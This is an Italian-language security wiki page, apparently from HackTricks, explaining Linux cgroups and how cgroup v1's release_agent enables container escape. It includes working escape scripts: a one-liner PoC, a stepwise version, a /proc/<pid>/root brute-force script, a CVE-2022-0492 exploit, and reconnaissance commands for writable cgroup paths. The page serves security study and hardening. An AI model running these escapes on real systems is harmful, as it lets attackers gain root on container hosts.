# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

I **control groups** di Linux sono il meccanismo del kernel utilizzato per raggruppare i processi ai fini di accounting, limitazione, definizione delle priorità e applicazione delle policy. Se i namespace riguardano principalmente l'isolamento della visualizzazione delle risorse, i cgroups riguardano principalmente la gestione di **quanto** di tali risorse un insieme di processi può consumare e, in alcuni casi, **con quali classi di risorse** può interagire. I container si basano costantemente sui cgroups, anche quando l'utente non li consulta mai direttamente, perché quasi ogni runtime moderno ha bisogno di un modo per comunicare al kernel "questi processi appartengono a questo workload e queste sono le regole sulle risorse che si applicano a loro".

Per questo i container engine inseriscono ogni nuovo container nel proprio sottoalbero di cgroup. Una volta che l'albero dei processi si trova lì, il runtime può limitare la memoria, limitare il numero di PID, assegnare un peso all'utilizzo della CPU, regolare l'I/O e limitare l'accesso ai device. In un ambiente di produzione, questo è essenziale sia per la sicurezza in scenari multi-tenant sia per una semplice gestione operativa. Un container privo di controlli significativi sulle risorse potrebbe esaurire la memoria, inondare il sistema di processi o monopolizzare CPU e I/O in modi che rendono instabili l'host o i workload adiacenti.

Dal punto di vista della sicurezza, i cgroups sono importanti per due motivi distinti. Primo, limiti sulle risorse errati o assenti consentono semplici attacchi di denial-of-service. Secondo, alcune funzionalità dei cgroups, soprattutto nelle configurazioni meno recenti di **cgroup v1**, hanno storicamente creato potenti primitive di breakout quando erano scrivibili dall'interno di un container.

## v1 vs v2

Esistono due modelli principali di cgroup in uso. **cgroup v1** espone più gerarchie di controller e i writeup degli exploit meno recenti ruotano spesso attorno alle semantiche strane e talvolta eccessivamente potenti disponibili in quel modello. **cgroup v2** introduce una gerarchia più unificata e, in generale, un comportamento più pulito. Le distribuzioni moderne preferiscono sempre più cgroup v2, ma esistono ancora ambienti misti o legacy, il che significa che entrambi i modelli restano rilevanti durante l'analisi di sistemi reali.

La differenza è importante perché alcune delle storie più famose di container breakout, come gli abusi di **`release_agent`** in cgroup v1, sono legate in modo molto specifico al comportamento dei cgroup meno recenti. Un lettore che vede un exploit dei cgroup su un blog e poi lo applica ciecamente a un sistema moderno che utilizza esclusivamente cgroup v2 rischia di fraintendere ciò che è realmente possibile sul target.

## Ispezione

Il modo più rapido per vedere in quale posizione si trova la shell corrente è:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Il file `/proc/self/cgroup` mostra i percorsi dei cgroup associati al processo corrente. Su un host moderno con cgroup v2, vedrai spesso una voce unificata. Su host più vecchi o ibridi, potresti vedere più percorsi dei controller v1. Una volta individuato il percorso, puoi ispezionare i file corrispondenti in `/sys/fs/cgroup` per visualizzare i limiti e l'utilizzo corrente.

Su un host con cgroup v2, sono utili i seguenti comandi:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Questi file rivelano quali controller esistono e quali sono delegati ai cgroups figli. Questo modello di delega è importante negli ambienti rootless e gestiti da systemd, dove il runtime potrebbe essere in grado di controllare solo il sottoinsieme delle funzionalità dei cgroups che la gerarchia padre delega effettivamente.

## Laboratorio

Un modo per osservare i cgroups nella pratica consiste nell'eseguire un container con memoria limitata:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Puoi anche provare un container limitato ai PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Questi esempi sono utili perché aiutano a collegare il flag del runtime all'interfaccia dei file del kernel. Il runtime non applica la regola per magia; scrive le impostazioni cgroup rilevanti e lascia quindi che sia il kernel ad applicarle all'albero dei processi.

## Utilizzo del runtime

Docker, Podman, containerd e CRI-O si affidano tutti ai cgroup come parte del normale funzionamento. Le differenze di solito non riguardano il fatto che usino o meno i cgroup, ma **quali valori predefiniti scelgono**, **come interagiscono con systemd**, **come funziona la delega rootless** e **quanta parte della configurazione è controllata a livello di engine rispetto al livello di orchestrazione**.

In Kubernetes, le richieste e i limiti delle risorse diventano infine configurazione cgroup sul nodo. Il percorso dal Pod YAML all'applicazione da parte del kernel passa attraverso kubelet, il runtime CRI e il runtime OCI, ma i cgroup restano comunque il meccanismo del kernel che applica definitivamente la regola. Negli ambienti Incus/LXC, i cgroup sono utilizzati ampiamente, soprattutto perché i system container spesso espongono un albero dei processi più ricco e aspettative operative più simili a quelle delle VM.

## Misconfigurazioni ed escape

La classica storia della sicurezza dei cgroup riguarda il meccanismo **`release_agent` di cgroup v1** scrivibile. In questo modello, se un attacker poteva scrivere nei file cgroup corretti, abilitare `notify_on_release` e controllare il percorso memorizzato in `release_agent`, il kernel poteva finire per eseguire un percorso scelto dall'attacker nei namespace iniziali dell'host quando il cgroup diventava vuoto. Ecco perché i writeup più vecchi dedicano così tanta attenzione alla possibilità di scrittura dei controller cgroup, alle opzioni di mount e alle condizioni relative a namespace/capability.

Anche quando `release_agent` non è disponibile, gli errori di configurazione dei cgroup sono comunque importanti. Un accesso ai device eccessivamente permissivo può rendere accessibili dall'container i device dell'host. L'assenza di limiti per memoria e PID può trasformare una semplice code execution in un DoS dell'host. Una delega cgroup debole negli scenari rootless può inoltre indurre i defender a presumere che esista una restrizione, quando in realtà il runtime non è mai stato in grado di applicarla.

### Background di `release_agent`

La tecnica `release_agent` si applica solo a **cgroup v1**. L'idea di base è che, quando l'ultimo processo di un cgroup termina e `notify_on_release=1` è impostato, il kernel esegue il programma il cui percorso è memorizzato in `release_agent`. L'esecuzione avviene nei **namespace iniziali dell'host**, ed è questo che trasforma un `release_agent` scrivibile in una primitiva di container escape.

Perché la tecnica funzioni, l'attacker generalmente necessita di:

- una gerarchia **cgroup v1** scrivibile
- la possibilità di creare o utilizzare un child cgroup
- la possibilità di impostare `notify_on_release`
- la possibilità di scrivere un percorso in `release_agent`
- un percorso che dal punto di vista dell'host risolva a un eseguibile

### PoC classico

La PoC storica in una sola riga è:<sup>[[1]](#references)</sup>
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Questo PoC scrive un percorso del payload in `release_agent`, attiva il rilascio del cgroup e quindi rilegge il file di output generato sull'host.

### Procedura dettagliata

La stessa idea è più facile da comprendere se suddivisa in passaggi.<sup>[[1]](#references)</sup>

1. Crea e prepara un cgroup scrivibile:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifica il percorso dell'host corrispondente al filesystem del container:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Deposita un payload che sarà visibile dal percorso dell'host:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Attiva l'esecuzione svuotando il cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
L'effetto è l'esecuzione lato host del payload con privilegi di root sull'host. In un exploit reale, il payload di solito scrive un proof file, avvia una reverse shell o modifica lo stato dell'host.

### Variante del percorso relativo usando `/proc/<pid>/root`

In alcuni ambienti, il percorso dell'host al filesystem del container non è ovvio o è nascosto dallo storage driver. In tal caso, il percorso del payload può essere espresso tramite `/proc/<pid>/root/...`, dove `<pid>` è un PID dell'host appartenente a un processo nel container corrente. Questo costituisce la base della variante di brute-force del percorso relativo:<sup>[[2]](#references)</sup>
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Il trick rilevante qui non è il brute force in sé, ma la forma del path: `/proc/<pid>/root/...` permette al kernel di risolvere un file all'interno del filesystem del container dal namespace dell'host, anche quando il path di storage diretto dell'host non è noto in anticipo.

### Variante CVE-2022-0492

Nel 2022, CVE-2022-0492 ha mostrato che la scrittura su `release_agent` in cgroup v1 non verificava correttamente la presenza di `CAP_SYS_ADMIN` nel **namespace utente iniziale**. Ciò rendeva la tecnica molto più accessibile sui kernel vulnerabili, perché un processo del container in grado di montare una gerarchia cgroup poteva scrivere su `release_agent` senza essere già privilegiato nel namespace utente dell'host.<sup>[[3]](#references)</sup>

Exploit minimo:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Su un kernel vulnerabile, l'host esegue `/proc/self/exe` con privilegi di root dell'host.

Per uno sfruttamento pratico, inizia verificando se l'ambiente espone ancora percorsi cgroup-v1 scrivibili o un accesso pericoloso ai dispositivi:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Se `release_agent` è presente e scrivibile, sei già in territorio di legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Se il percorso del cgroup in sé non consente un escape, il successivo impiego pratico è spesso il denial of service o la reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Questi comandi indicano rapidamente se il workload ha spazio sufficiente per eseguire un fork-bomb, consumare memoria in modo aggressivo o abusare di un'interfaccia cgroup legacy scrivibile.

## Controlli

Durante l'analisi di un target, lo scopo dei controlli sui cgroup è capire quale modello cgroup è in uso, se il container vede percorsi dei controller scrivibili e se primitive di breakout obsolete come `release_agent` siano effettivamente rilevanti.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Cosa è interessante qui:

- Se `mount | grep cgroup` mostra **cgroup v1**, i vecchi writeup sugli escape diventano più rilevanti.
- Se `release_agent` esiste ed è raggiungibile, vale immediatamente la pena di approfondire l'analisi.
- Se la gerarchia cgroup visibile è scrivibile e il container dispone anche di capabilities elevate, l'ambiente merita una revisione molto più approfondita.

Se scopri **cgroup v1**, mount dei controller scrivibili e un container che dispone anche di capabilities elevate o di protezioni seccomp/AppArmor deboli, questa combinazione merita particolare attenzione. I cgroup vengono spesso considerati un argomento noioso di gestione delle risorse, ma storicamente hanno fatto parte di alcune delle più istruttive catene di container escape, proprio perché il confine tra "controllo delle risorse" e "influenza sull'host" non era sempre così netto come si pensava.

## Default del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita | I container vengono inseriti automaticamente nei cgroup; i limiti delle risorse sono opzionali, a meno che non vengano impostati con dei flag | omettere `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Abilitato per impostazione predefinita | `--cgroups=enabled` è il valore predefinito; i valori predefiniti del namespace cgroup variano in base alla versione del cgroup (`private` su cgroup v2, `host` su alcune configurazioni cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, accesso rilassato ai device, `--privileged` |
| Kubernetes | Abilitato tramite il runtime per impostazione predefinita | Pod e container vengono inseriti nei cgroup dal runtime del nodo; il controllo granulare delle risorse dipende da `resources.requests` / `resources.limits` | omettere le richieste/i limiti delle risorse, accesso privilegiato ai device, configurazione errata del runtime a livello di host |
| containerd / CRI-O | Abilitato per impostazione predefinita | I cgroup fanno parte della normale gestione del ciclo di vita | configurazioni dirette del runtime che allentano i controlli sui device o espongono interfacce cgroup v1 legacy scrivibili |

La distinzione importante è che **l'esistenza dei cgroup** è solitamente predefinita, mentre i **vincoli utili sulle risorse** sono spesso opzionali, a meno che non vengano configurati esplicitamente.

## Riferimenti

- [1] [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [2] [Privileged Container Escape - Control Groups release_agent](http://blog.ajxchapman.com/containers/2020/11/19/privileged-container-escape.html)
- [3] [New Linux Vulnerability CVE-2022-0492 Affecting Cgroups: Can Containers Escape?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

{{#include ../../../../banners/hacktricks-training.md}}
